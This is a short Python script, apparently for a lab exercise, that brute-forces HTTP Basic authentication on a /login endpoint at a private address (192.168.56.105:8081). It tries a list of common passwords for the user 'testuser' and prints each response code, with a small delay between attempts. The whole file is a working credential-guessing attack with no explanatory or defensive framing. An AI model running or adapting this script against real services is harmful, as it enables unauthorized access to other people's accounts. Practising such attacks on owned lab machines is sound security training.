import urllib.request
import urllib.error
import base64
import time

TARGET = "192.168.56.105"
PORT = 8081
USERNAME = "testuser"

PASSWORDS = [
    "password",
    "123456",
    "admin",
    "test",
    "welcome",
    "qwerty",
    "letmein",
    "password123",
    "Cyber123",
]

for password in PASSWORDS:
    credentials = f"{USERNAME}:{password}"
    encoded = base64.b64encode(credentials.encode()).decode()

    request = urllib.request.Request(
        f"http://{TARGET}:{PORT}/login"
    )

    request.add_header(
        "Authorization",
        f"Basic {encoded}"
    )

    try:
        response = urllib.request.urlopen(request, timeout=2)
        print(password, "→", response.status)

    except urllib.error.HTTPError as e:
        print(password, "→", e.code)

    time.sleep(0.2)
